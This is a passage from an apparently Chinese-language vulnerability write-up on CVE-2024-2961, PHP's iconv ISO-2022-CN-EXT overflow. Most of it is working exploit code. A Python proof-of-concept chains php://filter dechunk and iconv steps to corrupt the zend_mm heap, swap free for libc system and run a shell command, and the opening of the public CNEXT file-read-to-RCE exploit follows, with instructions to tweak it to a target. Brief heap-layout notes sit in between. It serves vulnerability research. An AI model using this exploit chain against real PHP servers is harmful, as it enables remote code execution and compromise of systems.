</span><span style="color:#c0c5ce;">        &quot;</span><span style="color:#a3be8c;">convert.iconv.UTF-8.ISO-2022-CN-EXT</span><span style="color:#c0c5ce;">&quot;
</span><span style="color:#c0c5ce;">    ]
</span><span style="color:#c0c5ce;">    filters = &quot;</span><span style="color:#a3be8c;">|</span><span style="color:#c0c5ce;">&quot;.</span><span style="color:#8fa1b3;">join</span><span style="color:#c0c5ce;">(filters)
</span><span style="color:#c0c5ce;">    path = </span><span style="color:#b48ead;">f</span><span style="color:#c0c5ce;">&quot;</span><span style="color:#a3be8c;">php://filter/read=</span><span style="color:#c0c5ce;">{filters}</span><span style="color:#a3be8c;">/resource=</span><span style="color:#c0c5ce;">{resource}&quot;
</span><span style="color:#c0c5ce;">    </span><span style="color:#b48ead;">return </span><span style="color:#c0c5ce;">path
</span><span style="color:#c0c5ce;">
</span><span style="color:#b48ead;">def </span><span style="color:#8fa1b3;">buildPayload5</span><span style="color:#c0c5ce;">() -&gt; str:
</span><span style="color:#c0c5ce;">    </span><span style="color:#65737e;">&#39;&#39;&#39;
</span><span style="color:#65737e;">    我们把一次处理dechunk + convert.iconv.的过程算一步
</span><span style="color:#65737e;">    &#39;&#39;&#39;
</span><span style="color:#c0c5ce;">    heapSize = </span><span style="color:#d08770;">0x100
</span><span style="color:#c0c5ce;">    </span><span style="color:#bf616a;">BUG </span><span style="color:#c0c5ce;">= &quot;</span><span style="color:#a3be8c;">劄</span><span style="color:#c0c5ce;">&quot;.</span><span style="color:#8fa1b3;">encode</span><span style="color:#c0c5ce;">(&quot;</span><span style="color:#a3be8c;">utf-8</span><span style="color:#c0c5ce;">&quot;)
</span><span style="color:#c0c5ce;">    </span><span style="color:#65737e;"># _zend_mm_heap基地址
</span><span style="color:#c0c5ce;">    zend_heap_base = </span><span style="color:#d08770;">0x7ffff5800040
</span><span style="color:#c0c5ce;">    </span><span style="color:#65737e;"># libc 的基地址
</span><span style="color:#c0c5ce;">    libc_base = </span><span style="color:#d08770;">0x7ffff7aa9000
</span><span style="color:#c0c5ce;">    </span><span style="color:#bf616a;">CMD </span><span style="color:#c0c5ce;">= &quot;</span><span style="color:#a3be8c;">ls -alF</span><span style="color:#c0c5ce;">&quot;
</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">    </span><span style="color:#65737e;"># 第一步申请0x100的堆，第二步释放
</span><span style="color:#c0c5ce;">    </span><span style="color:#65737e;"># 第三次dechunk，长度小于0x100
</span><span style="color:#c0c5ce;">    step1_malloc_step2_free = </span><span style="color:#8fa1b3;">chunked_add_bad_data</span><span style="color:#c0c5ce;">(</span><span style="color:#b48ead;">b</span><span style="color:#c0c5ce;">&quot;</span><span style="color:#a3be8c;">A</span><span style="color:#c0c5ce;">&quot; * </span><span style="color:#d08770;">8</span><span style="color:#c0c5ce;">, </span><span style="color:#8fa1b3;">p64</span><span style="color:#c0c5ce;">(zend_heap_base + </span><span style="color:#d08770;">0x10</span><span style="color:#c0c5ce;">) * </span><span style="color:#d08770;">10</span><span style="color:#c0c5ce;">, </span><span style="color:#d08770;">0xA0</span><span style="color:#c0c5ce;">)
</span><span style="color:#c0c5ce;">    </span><span style="color:#65737e;"># 第二次dechunk，长度小于0x100
</span><span style="color:#c0c5ce;">    step1_malloc_step2_free = </span><span style="color:#8fa1b3;">chunked_chunk</span><span style="color:#c0c5ce;">(step1_malloc_step2_free, heapSize)
</span><span style="color:#c0c5ce;">    </span><span style="color:#65737e;"># 第一次dechunk，长度等于0x100
</span><span style="color:#c0c5ce;">    step1_malloc_step2_free = </span><span style="color:#8fa1b3;">compressed_bucket</span><span style="color:#c0c5ce;">(step1_malloc_step2_free)
</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">    </span><span style="color:#65737e;"># 第二步申请0x100的堆，第三步释放
</span><span style="color:#c0c5ce;">    step2_malloc_step3_free = </span><span style="color:#b48ead;">b</span><span style="color:#c0c5ce;">&quot;</span><span style="color:#a3be8c;">B</span><span style="color:#c0c5ce;">&quot; * </span><span style="color:#d08770;">0x20
</span><span style="color:#c0c5ce;">    </span><span style="color:#65737e;"># 第三次dechunk，长度小于0x100
</span><span style="color:#c0c5ce;">    step2_malloc_step3_free = </span><span style="color:#8fa1b3;">chunked_chunk</span><span style="color:#c0c5ce;">(step2_malloc_step3_free, heapSize)
</span><span style="color:#c0c5ce;">    </span><span style="color:#65737e;"># 第二次dechunk，长度等于0x100
</span><span style="color:#c0c5ce;">    step2_malloc_step3_free = </span><span style="color:#8fa1b3;">chunked_chunk</span><span style="color:#c0c5ce;">(step2_malloc_step3_free)
</span><span style="color:#c0c5ce;">    </span><span style="color:#65737e;"># 第一次dechunk，长度大于0x100
</span><span style="color:#c0c5ce;">    step2_malloc_step3_free = </span><span style="color:#8fa1b3;">compressed_bucket</span><span style="color:#c0c5ce;">(step2_malloc_step3_free)
</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">    </span><span style="color:#65737e;"># 第三步触发bug
</span><span style="color:#c0c5ce;">    step3_trigger_bug = (</span><span style="color:#d08770;">0x100 </span><span style="color:#c0c5ce;">- </span><span style="color:#96b5b4;">len</span><span style="color:#c0c5ce;">(</span><span style="color:#bf616a;">BUG</span><span style="color:#c0c5ce;">)) * </span><span style="color:#b48ead;">b</span><span style="color:#c0c5ce;">&quot;</span><span style="color:#96b5b4;">\x00</span><span style="color:#c0c5ce;">&quot; + </span><span style="color:#bf616a;">BUG
</span><span style="color:#c0c5ce;">    </span><span style="color:#65737e;"># 确保长度为0x100
</span><span style="color:#c0c5ce;">    </span><span style="color:#b48ead;">assert </span><span style="color:#96b5b4;">len</span><span style="color:#c0c5ce;">(step3_trigger_bug) == </span><span style="color:#d08770;">0x100
</span><span style="color:#c0c5ce;">    </span><span style="color:#65737e;"># 第三次dechunk，长度等于0x100
</span><span style="color:#c0c5ce;">    step3_trigger_bug = </span><span style="color:#8fa1b3;">chunked_chunk</span><span style="color:#c0c5ce;">(step3_trigger_bug)
</span><span style="color:#c0c5ce;">    </span><span style="color:#65737e;"># 第二次dechunk，长度大于0x100
</span><span style="color:#c0c5ce;">    step3_trigger_bug = </span><span style="color:#8fa1b3;">chunked_chunk</span><span style="color:#c0c5ce;">(step3_trigger_bug)
</span><span style="color:#c0c5ce;">    </span><span style="color:#65737e;"># 第一次dechunk，长度大于0x100
</span><span style="color:#c0c5ce;">    step3_trigger_bug = </span><span style="color:#8fa1b3;">compressed_bucket</span><span style="color:#c0c5ce;">(step3_trigger_bug)
</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">    </span><span style="color:#65737e;"># 第三次dechunk, 0\n
</span><span style="color:#c0c5ce;">    </span><span style="color:#65737e;"># step3_trailer_chunk = b&quot;0\n&quot;.ljust(0x48, b&quot;\x00&quot;) + p64(zend_heap_base + 0x10)
</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">    </span><span style="color:#65737e;"># step3_trailer_chunk += b&quot;\x00&quot; * (heapSize - len(step3_trailer_chunk))
</span><span style="color:#c0c5ce;">    </span><span style="color:#65737e;"># # 第二次dechunk，长度等于0x100
</span><span style="color:#c0c5ce;">    </span><span style="color:#65737e;"># step3_trailer_chunk = chunked_chunk(step3_trailer_chunk)
</span><span style="color:#c0c5ce;">    </span><span style="color:#65737e;"># # 第一次dechunk，长度大于0x100
</span><span style="color:#c0c5ce;">    </span><span style="color:#65737e;"># step3_trailer_chunk = compressed_bucket(step3_trailer_chunk)
</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">    </span><span style="color:#65737e;"># 第四步 申请0x100堆块 覆盖_zend_mm_heap
</span><span style="color:#c0c5ce;">    step4_write_zend_heap = </span><span style="color:#8fa1b3;">ptr_bucket</span><span style="color:#c0c5ce;">(
</span><span style="color:#c0c5ce;">        </span><span style="color:#d08770;">0x200000</span><span style="color:#c0c5ce;">,
</span><span style="color:#c0c5ce;">        </span><span style="color:#d08770;">0</span><span style="color:#c0c5ce;">,
</span><span style="color:#c0c5ce;">        </span><span style="color:#65737e;"># free_slot
</span><span style="color:#c0c5ce;">        </span><span style="color:#d08770;">0</span><span style="color:#c0c5ce;">,
</span><span style="color:#c0c5ce;">        </span><span style="color:#d08770;">0</span><span style="color:#c0c5ce;">,
</span><span style="color:#c0c5ce;">        zend_heap_base + </span><span style="color:#d08770;">0x168</span><span style="color:#c0c5ce;">,  </span><span style="color:#65737e;"># 0x18
</span><span style="color:#c0c5ce;">        </span><span style="color:#d08770;">0</span><span style="color:#c0c5ce;">,
</span><span style="color:#c0c5ce;">        </span><span style="color:#d08770;">0</span><span style="color:#c0c5ce;">,
</span><span style="color:#c0c5ce;">        </span><span style="color:#d08770;">0</span><span style="color:#c0c5ce;">,
</span><span style="color:#c0c5ce;">        </span><span style="color:#d08770;">0</span><span style="color:#c0c5ce;">,
</span><span style="color:#c0c5ce;">        </span><span style="color:#d08770;">0</span><span style="color:#c0c5ce;">,
</span><span style="color:#c0c5ce;">        </span><span style="color:#d08770;">0</span><span style="color:#c0c5ce;">,
</span><span style="color:#c0c5ce;">        </span><span style="color:#d08770;">0</span><span style="color:#c0c5ce;">,
</span><span style="color:#c0c5ce;">        </span><span style="color:#d08770;">0</span><span style="color:#c0c5ce;">,
</span><span style="color:#c0c5ce;">        </span><span style="color:#d08770;">0</span><span style="color:#c0c5ce;">,
</span><span style="color:#c0c5ce;">        </span><span style="color:#d08770;">0</span><span style="color:#c0c5ce;">,
</span><span style="color:#c0c5ce;">        </span><span style="color:#d08770;">0</span><span style="color:#c0c5ce;">,
</span><span style="color:#c0c5ce;">        </span><span style="color:#d08770;">0</span><span style="color:#c0c5ce;">,
</span><span style="color:#c0c5ce;">        </span><span style="color:#d08770;">0</span><span style="color:#c0c5ce;">,
</span><span style="color:#c0c5ce;">        zend_heap_base,  </span><span style="color:#65737e;"># 0x140
</span><span style="color:#c0c5ce;">        </span><span style="color:#d08770;">0</span><span style="color:#c0c5ce;">,
</span><span style="color:#c0c5ce;">        </span><span style="color:#d08770;">0</span><span style="color:#c0c5ce;">,
</span><span style="color:#c0c5ce;">        </span><span style="color:#d08770;">0</span><span style="color:#c0c5ce;">,
</span><span style="color:#c0c5ce;">        </span><span style="color:#d08770;">0</span><span style="color:#c0c5ce;">,
</span><span style="color:#c0c5ce;">        </span><span style="color:#d08770;">0</span><span style="color:#c0c5ce;">,
</span><span style="color:#c0c5ce;">        </span><span style="color:#d08770;">0</span><span style="color:#c0c5ce;">,
</span><span style="color:#c0c5ce;">        </span><span style="color:#d08770;">0</span><span style="color:#c0c5ce;">,
</span><span style="color:#c0c5ce;">        </span><span style="color:#d08770;">0</span><span style="color:#c0c5ce;">,
</span><span style="color:#c0c5ce;">        </span><span style="color:#d08770;">0</span><span style="color:#c0c5ce;">,
</span><span style="color:#c0c5ce;">        </span><span style="color:#d08770;">0</span><span style="color:#c0c5ce;">,
</span><span style="color:#c0c5ce;">        </span><span style="color:#d08770;">0</span><span style="color:#c0c5ce;">,
</span><span style="color:#c0c5ce;">        </span><span style="color:#d08770;">0</span><span style="color:#c0c5ce;">,
</span><span style="color:#c0c5ce;">        </span><span style="color:#d08770;">0</span><span style="color:#c0c5ce;">,
</span><span style="color:#c0c5ce;">        </span><span style="color:#bf616a;">size</span><span style="color:#c0c5ce;">=</span><span style="color:#d08770;">0x100</span><span style="color:#c0c5ce;">,
</span><span style="color:#c0c5ce;">    )
</span><span style="color:#c0c5ce;">    step4_write_zend_heap = </span><span style="color:#8fa1b3;">chunked_chunk</span><span style="color:#c0c5ce;">(step4_write_zend_heap)
</span><span style="color:#c0c5ce;">    step4_write_zend_heap = </span><span style="color:#8fa1b3;">chunked_chunk</span><span style="color:#c0c5ce;">(step4_write_zend_heap)
</span><span style="color:#c0c5ce;">    step4_write_zend_heap = </span><span style="color:#8fa1b3;">compressed_bucket</span><span style="color:#c0c5ce;">(step4_write_zend_heap)
</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">    </span><span style="color:#bf616a;">LIBC </span><span style="color:#c0c5ce;">= </span><span style="color:#8fa1b3;">ELF</span><span style="color:#c0c5ce;">(&quot;</span><span style="color:#a3be8c;">/usr/lib/x86_64-linux-gnu/libc.so.6</span><span style="color:#c0c5ce;">&quot;, </span><span style="color:#bf616a;">checksec</span><span style="color:#c0c5ce;">=</span><span style="color:#d08770;">False</span><span style="color:#c0c5ce;">) </span><span style="color:#65737e;"># /usr/lib/x86_64-linux-gnu/libc.so.6
</span><span style="color:#c0c5ce;">    mallocAddr = libc_base + </span><span style="color:#bf616a;">LIBC</span><span style="color:#c0c5ce;">.symbols[&quot;</span><span style="color:#a3be8c;">__libc_malloc</span><span style="color:#c0c5ce;">&quot;]
</span><span style="color:#c0c5ce;">    systemAddr = libc_base + </span><span style="color:#bf616a;">LIBC</span><span style="color:#c0c5ce;">.symbols[&quot;</span><span style="color:#a3be8c;">__libc_system</span><span style="color:#c0c5ce;">&quot;] </span><span style="color:#65737e;"># 0x7ffff7af9d60
</span><span style="color:#c0c5ce;">    reallocAddr = libc_base + </span><span style="color:#bf616a;">LIBC</span><span style="color:#c0c5ce;">.symbols[&quot;</span><span style="color:#a3be8c;">__libc_realloc</span><span style="color:#c0c5ce;">&quot;]
</span><span style="color:#c0c5ce;">    </span><span style="color:#96b5b4;">print</span><span style="color:#c0c5ce;">(&quot;</span><span style="color:#a3be8c;">systemAddr: </span><span style="color:#c0c5ce;">&quot;, </span><span style="color:#96b5b4;">hex</span><span style="color:#c0c5ce;">(systemAddr))
</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">    </span><span style="color:#65737e;"># 第四步申请0x18堆块 覆盖custom heap
</span><span style="color:#c0c5ce;">    step4_write_custom_heap = </span><span style="color:#8fa1b3;">ptr_bucket</span><span style="color:#c0c5ce;">(
</span><span style="color:#c0c5ce;">        mallocAddr, systemAddr, reallocAddr, </span><span style="color:#bf616a;">size</span><span style="color:#c0c5ce;">=</span><span style="color:#d08770;">0x18
</span><span style="color:#c0c5ce;">    )
</span><span style="color:#c0c5ce;">    step4_write_custom_heap = </span><span style="color:#8fa1b3;">chunked_chunk</span><span style="color:#c0c5ce;">(step4_write_custom_heap)
</span><span style="color:#c0c5ce;">    step4_write_custom_heap = </span><span style="color:#8fa1b3;">chunked_chunk</span><span style="color:#c0c5ce;">(step4_write_custom_heap)
</span><span style="color:#c0c5ce;">    step4_write_custom_heap = </span><span style="color:#8fa1b3;">compressed_bucket</span><span style="color:#c0c5ce;">(step4_write_custom_heap)
</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">    </span><span style="color:#65737e;"># 第四步申请0x140堆块 命令写入chunk中
</span><span style="color:#c0c5ce;">    step4_use_custom_heap_and_cmd = </span><span style="color:#b48ead;">b</span><span style="color:#c0c5ce;">&quot;</span><span style="color:#a3be8c;">kill -9 $PPID; </span><span style="color:#c0c5ce;">&quot; + CMD.</span><span style="color:#8fa1b3;">encode</span><span style="color:#c0c5ce;">()
</span><span style="color:#c0c5ce;">    step4_use_custom_heap_and_cmd = step4_use_custom_heap_and_cmd.</span><span style="color:#8fa1b3;">ljust</span><span style="color:#c0c5ce;">(</span><span style="color:#d08770;">0x140</span><span style="color:#c0c5ce;">, </span><span style="color:#b48ead;">b</span><span style="color:#c0c5ce;">&quot;</span><span style="color:#96b5b4;">\x00</span><span style="color:#c0c5ce;">&quot;)
</span><span style="color:#c0c5ce;">    step4_use_custom_heap_and_cmd = </span><span style="color:#8fa1b3;">qpe</span><span style="color:#c0c5ce;">(step4_use_custom_heap_and_cmd)
</span><span style="color:#c0c5ce;">    step4_use_custom_heap_and_cmd = </span><span style="color:#8fa1b3;">chunked_chunk</span><span style="color:#c0c5ce;">(step4_use_custom_heap_and_cmd)
</span><span style="color:#c0c5ce;">    step4_use_custom_heap_and_cmd = </span><span style="color:#8fa1b3;">chunked_chunk</span><span style="color:#c0c5ce;">(step4_use_custom_heap_and_cmd)
</span><span style="color:#c0c5ce;">    step4_use_custom_heap_and_cmd = </span><span style="color:#8fa1b3;">compressed_bucket</span><span style="color:#c0c5ce;">(step4_use_custom_heap_and_cmd)
</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">    pages = (
</span><span style="color:#c0c5ce;">        step4_write_zend_heap * </span><span style="color:#d08770;">4 </span><span style="color:#c0c5ce;">+
</span><span style="color:#c0c5ce;">        step4_write_custom_heap +
</span><span style="color:#c0c5ce;">        step4_use_custom_heap_and_cmd +
</span><span style="color:#c0c5ce;">        step1_malloc_step2_free * </span><span style="color:#d08770;">3 </span><span style="color:#c0c5ce;">+
</span><span style="color:#c0c5ce;">        step2_malloc_step3_free * </span><span style="color:#d08770;">2 </span><span style="color:#c0c5ce;">+
</span><span style="color:#c0c5ce;">        step3_trigger_bug
</span><span style="color:#c0c5ce;">    )
</span><span style="color:#c0c5ce;">    resource = </span><span style="color:#8fa1b3;">compress</span><span style="color:#c0c5ce;">(pages)
</span><span style="color:#c0c5ce;">    resource = base64.</span><span style="color:#8fa1b3;">b64encode</span><span style="color:#c0c5ce;">(resource)
</span><span style="color:#c0c5ce;">    resource = </span><span style="color:#b48ead;">f</span><span style="color:#c0c5ce;">&quot;</span><span style="color:#a3be8c;">data:text/plain;base64,</span><span style="color:#c0c5ce;">{resource.</span><span style="color:#8fa1b3;">decode</span><span style="color:#c0c5ce;">()}&quot;
</span><span style="color:#c0c5ce;">    filters = [
</span><span style="color:#c0c5ce;">        </span><span style="color:#65737e;"># zlib解压缩
</span><span style="color:#c0c5ce;">        &quot;</span><span style="color:#a3be8c;">zlib.inflate</span><span style="color:#c0c5ce;">&quot;,
</span><span style="color:#c0c5ce;">        </span><span style="color:#65737e;"># 第一步
</span><span style="color:#c0c5ce;">        &quot;</span><span style="color:#a3be8c;">dechunk</span><span style="color:#c0c5ce;">&quot;,
</span><span style="color:#c0c5ce;">        &quot;</span><span style="color:#a3be8c;">convert.iconv.latin1.latin1</span><span style="color:#c0c5ce;">&quot;,
</span><span style="color:#c0c5ce;">        </span><span style="color:#65737e;"># 第二步
</span><span style="color:#c0c5ce;">        &quot;</span><span style="color:#a3be8c;">dechunk</span><span style="color:#c0c5ce;">&quot;,
</span><span style="color:#c0c5ce;">        &quot;</span><span style="color:#a3be8c;">convert.iconv.latin1.latin1</span><span style="color:#c0c5ce;">&quot;,
</span><span style="color:#c0c5ce;">        </span><span style="color:#65737e;"># 第三步触发漏洞
</span><span style="color:#c0c5ce;">        &quot;</span><span style="color:#a3be8c;">dechunk</span><span style="color:#c0c5ce;">&quot;,
</span><span style="color:#c0c5ce;">        &quot;</span><span style="color:#a3be8c;">convert.iconv.UTF-8.ISO-2022-CN-EXT</span><span style="color:#c0c5ce;">&quot;,
</span><span style="color:#c0c5ce;">        </span><span style="color:#65737e;"># 第四步，写入数据然后执行命令
</span><span style="color:#c0c5ce;">        &quot;</span><span style="color:#a3be8c;">convert.quoted-printable-decode</span><span style="color:#c0c5ce;">&quot;,
</span><span style="color:#c0c5ce;">        &quot;</span><span style="color:#a3be8c;">convert.iconv.latin1.latin1</span><span style="color:#c0c5ce;">&quot;,
</span><span style="color:#c0c5ce;">    ]
</span><span style="color:#c0c5ce;">    filters = &quot;</span><span style="color:#a3be8c;">|</span><span style="color:#c0c5ce;">&quot;.</span><span style="color:#8fa1b3;">join</span><span style="color:#c0c5ce;">(filters)
</span><span style="color:#c0c5ce;">    path = </span><span style="color:#b48ead;">f</span><span style="color:#c0c5ce;">&quot;</span><span style="color:#a3be8c;">php://filter/read=</span><span style="color:#c0c5ce;">{filters}</span><span style="color:#a3be8c;">/resource=</span><span style="color:#c0c5ce;">{resource}&quot;
</span><span style="color:#c0c5ce;">    </span><span style="color:#b48ead;">return </span><span style="color:#c0c5ce;">path
</span><span style="color:#c0c5ce;">
</span><span style="color:#b48ead;">def </span><span style="color:#8fa1b3;">f</span><span style="color:#c0c5ce;">(</span><span style="color:#bf616a;">idx</span><span style="color:#c0c5ce;">):
</span><span style="color:#c0c5ce;">    filename = &quot;</span><span style="color:#a3be8c;">tmp</span><span style="color:#c0c5ce;">&quot;
</span><span style="color:#c0c5ce;">    </span><span style="color:#b48ead;">if </span><span style="color:#c0c5ce;">idx == </span><span style="color:#d08770;">1</span><span style="color:#c0c5ce;">:
</span><span style="color:#c0c5ce;">       path = </span><span style="color:#8fa1b3;">buildPayload1</span><span style="color:#c0c5ce;">()
</span><span style="color:#c0c5ce;">       filename = &quot;</span><span style="color:#a3be8c;">poc1.php</span><span style="color:#c0c5ce;">&quot;
</span><span style="color:#c0c5ce;">    </span><span style="color:#b48ead;">elif </span><span style="color:#c0c5ce;">idx == </span><span style="color:#d08770;">2</span><span style="color:#c0c5ce;">:
</span><span style="color:#c0c5ce;">        path = </span><span style="color:#8fa1b3;">buildPayload2</span><span style="color:#c0c5ce;">()
</span><span style="color:#c0c5ce;">        filename = &quot;</span><span style="color:#a3be8c;">poc2.php</span><span style="color:#c0c5ce;">&quot;
</span><span style="color:#c0c5ce;">    </span><span style="color:#b48ead;">elif </span><span style="color:#c0c5ce;">idx == </span><span style="color:#d08770;">3</span><span style="color:#c0c5ce;">:
</span><span style="color:#c0c5ce;">        path = </span><span style="color:#8fa1b3;">buildPayload3</span><span style="color:#c0c5ce;">()
</span><span style="color:#c0c5ce;">        filename = &quot;</span><span style="color:#a3be8c;">poc3.php</span><span style="color:#c0c5ce;">&quot;
</span><span style="color:#c0c5ce;">    </span><span style="color:#b48ead;">elif </span><span style="color:#c0c5ce;">idx == </span><span style="color:#d08770;">4</span><span style="color:#c0c5ce;">:
</span><span style="color:#c0c5ce;">        path = </span><span style="color:#8fa1b3;">buildPayload4</span><span style="color:#c0c5ce;">()
</span><span style="color:#c0c5ce;">        filename = &quot;</span><span style="color:#a3be8c;">poc4.php</span><span style="color:#c0c5ce;">&quot;
</span><span style="color:#c0c5ce;">    </span><span style="color:#b48ead;">elif </span><span style="color:#c0c5ce;">idx == </span><span style="color:#d08770;">5</span><span style="color:#c0c5ce;">:
</span><span style="color:#c0c5ce;">        path = </span><span style="color:#8fa1b3;">buildPayload5</span><span style="color:#c0c5ce;">()
</span><span style="color:#c0c5ce;">        filename = &quot;</span><span style="color:#a3be8c;">poc5.php</span><span style="color:#c0c5ce;">&quot;
</span><span style="color:#c0c5ce;">    </span><span style="color:#b48ead;">else</span><span style="color:#c0c5ce;">:
</span><span style="color:#c0c5ce;">        </span><span style="color:#b48ead;">raise </span><span style="color:#c0c5ce;">Exception(</span><span style="color:#b48ead;">f</span><span style="color:#c0c5ce;">&quot;</span><span style="color:#a3be8c;">invalid idx = </span><span style="color:#c0c5ce;">{idx}</span><span style="color:#a3be8c;">!</span><span style="color:#c0c5ce;">&quot;)
</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">    phpCode = </span><span style="color:#b48ead;">f</span><span style="color:#c0c5ce;">&quot;&quot;&quot;</span><span style="color:#a3be8c;">&lt;?php
</span><span style="color:#a3be8c;">$poc = &quot;</span><span style="color:#c0c5ce;">{path}</span><span style="color:#a3be8c;">&quot;;
</span><span style="color:#a3be8c;">$data = file_get_contents($poc);
</span><span style="color:#a3be8c;">var_dump($data);
</span><span style="color:#a3be8c;">?&gt;</span><span style="color:#c0c5ce;">&quot;&quot;&quot;
</span><span style="color:#c0c5ce;">    </span><span style="color:#b48ead;">with </span><span style="color:#96b5b4;">open</span><span style="color:#c0c5ce;">(filename, &quot;</span><span style="color:#a3be8c;">w</span><span style="color:#c0c5ce;">&quot;) </span><span style="color:#b48ead;">as </span><span style="color:#c0c5ce;">f:
</span><span style="color:#c0c5ce;">        f.</span><span style="color:#8fa1b3;">write</span><span style="color:#c0c5ce;">(phpCode)
</span><span style="color:#c0c5ce;">    </span><span style="color:#96b5b4;">print</span><span style="color:#c0c5ce;">(filename, &quot;</span><span style="color:#a3be8c;"> ====&gt; </span><span style="color:#c0c5ce;">&quot;, path)
</span><span style="color:#c0c5ce;">
</span><span style="color:#b48ead;">if </span><span style="color:#c0c5ce;">__name__ == &quot;</span><span style="color:#a3be8c;">__main__</span><span style="color:#c0c5ce;">&quot;:
</span><span style="color:#c0c5ce;">    </span><span style="color:#b48ead;">for </span><span style="color:#c0c5ce;">i </span><span style="color:#b48ead;">in </span><span style="color:#96b5b4;">range</span><span style="color:#c0c5ce;">(</span><span style="color:#d08770;">1</span><span style="color:#c0c5ce;">, </span><span style="color:#d08770;">6</span><span style="color:#c0c5ce;">):
</span><span style="color:#c0c5ce;">        </span><span style="color:#8fa1b3;">f</span><span style="color:#c0c5ce;">(i)
</span></pre>
<p><code>convert.quoted-printable-decode</code>
将形如<code>=A0</code>转换为对应字节码</p>
<p>dechunk+iconv
第一次：
step1_malloc_step2_free*3 申请0x100三个chunk A-&gt;B-&gt;C
第二次：
step1_malloc_step2_free*3 依次释放三个0x100的chunkABC，freeslot: C-&gt;B-&gt;A
step2_malloc_step3_free*2 依次申请两个0x100的chunk C B
第三次
step2_malloc_step3_free*2 依次释放两个0x100 chunkCB，freeslot:B-&gt;C-&gt;A(0x100)
step3_trigger_bug 申请0x100 chunk B，触发iconv 越界写入一字节0x48
此时free_slot布局：B-&gt;C-&gt;A_0x48(0x148)-&gt;_zend_mm_heap (再申请四次即可覆写堆管理区域)
第四次
step4_write_zend_heap 先申请四个0x100 chunk 覆写free_slot（0x18 0x140）
step4_write_custom_heap 申请0x18 chunk，custom_heap中free指针处写入system地址
step4_use_custom_heap_and_cmd 申请0x140 chunk 写入待执行命令</p>
<p>out_buf_size 原始buf长度
ocnt 剩余空间
strconvert后通过<code>out_buf_size-ocnt</code>计算使用空间，更新bucket-&gt;buflen
之后再次iconv convert  根据更新后的bucket-&gt;buflen，申请内存存储内容作为新bucket</p>
<p>经过quoted-printable-encode编码的chunk经过解码才会变为原始大小 触发对应大小申请逻辑
<img src="./images/CVE-2024-2961.svg" alt="" /></p>
<h2 id="exp">exp</h2><p>通过读取<code>/proc/self/map</code>获取内存地址</p>
<pre style="background-color:#2b303b;">
<span style="color:#65737e;">#!/usr/bin/env python3
</span><span style="color:#65737e;">#
</span><span style="color:#65737e;"># CNEXT: PHP file-read to RCE (CVE-2024-2961)
</span><span style="color:#65737e;"># Date: 2024-05-27
</span><span style="color:#65737e;"># Author: Charles FOL @cfreal_ (LEXFO/AMBIONICS)
</span><span style="color:#65737e;">#
</span><span style="color:#65737e;"># TODO Parse LIBC to know if patched
</span><span style="color:#65737e;">#
</span><span style="color:#65737e;"># INFORMATIONS
</span><span style="color:#65737e;">#
</span><span style="color:#65737e;"># To use, implement the Remote class, which tells the exploit how to send the payload.
</span><span style="color:#65737e;">#
</span><span style="color:#c0c5ce;">
</span><span style="color:#b48ead;">from </span><span style="color:#c0c5ce;">__future__ </span><span style="color:#b48ead;">import </span><span style="color:#c0c5ce;">annotations
</span><span style="color:#c0c5ce;">
</span><span style="color:#b48ead;">import </span><span style="color:#c0c5ce;">base64
</span><span style="color:#b48ead;">import </span><span style="color:#c0c5ce;">zlib
</span><span style="color:#c0c5ce;">
</span><span style="color:#b48ead;">from </span><span style="color:#c0c5ce;">dataclasses </span><span style="color:#b48ead;">import </span><span style="color:#c0c5ce;">dataclass
</span><span style="color:#b48ead;">from </span><span style="color:#c0c5ce;">requests.exceptions </span><span style="color:#b48ead;">import </span><span style="color:#c0c5ce;">ConnectionError, ChunkedEncodingError
</span><span style="color:#c0c5ce;">
</span><span style="color:#b48ead;">from </span><span style="color:#c0c5ce;">pwn </span><span style="color:#b48ead;">import </span><span style="color:#d08770;">*
</span><span style="color:#b48ead;">from </span><span style="color:#c0c5ce;">ten </span><span style="color:#b48ead;">import </span><span style="color:#d08770;">*
</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">
</span><span style="color:#bf616a;">HEAP_SIZE </span><span style="color:#c0c5ce;">= </span><span style="color:#d08770;">2 </span><span style="color:#c0c5ce;">* </span><span style="color:#d08770;">1024 </span><span style="color:#c0c5ce;">* </span><span style="color:#d08770;">1024
</span><span style="color:#bf616a;">BUG </span><span style="color:#c0c5ce;">= &quot;</span><span style="color:#a3be8c;">劄</span><span style="color:#c0c5ce;">&quot;.</span><span style="color:#8fa1b3;">encode</span><span style="color:#c0c5ce;">(&quot;</span><span style="color:#a3be8c;">utf-8</span><span style="color:#c0c5ce;">&quot;)
</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">
</span><span style="color:#b48ead;">class </span><span style="color:#ebcb8b;">Remote</span><span style="color:#eff1f5;">:
</span><span style="color:#c0c5ce;">    </span><span style="color:#65737e;">&quot;&quot;&quot;A helper class to send the payload and download files.
</span><span style="color:#65737e;">    
</span><span style="color:#65737e;">    The logic of the exploit is always the same, but the exploit needs to know how to
</span><span style="color:#65737e;">    download files (/proc/self/maps and libc) and how to send the payload.
</span><span style="color:#65737e;">    
</span><span style="color:#65737e;">    The code here serves as an example that attacks a page that looks like:
</span><span style="color:#65737e;">    
</span><span style="color:#65737e;">    ```php
</span><span style="color:#65737e;">    &lt;?php
</span><span style="color:#65737e;">    
</span><span style="color:#65737e;">    $data = file_get_contents($_POST[&#39;file&#39;]);
</span><span style="color:#65737e;">    echo &quot;File contents: $data&quot;;
</span><span style="color:#65737e;">    ```
</span><span style="color:#65737e;">    
</span><span style="color:#65737e;">    Tweak it to fit your target, and start the exploit.
</span><span style="color:#65737e;">    &quot;&quot;&quot;
</span><span style="color:#c0c5ce;">
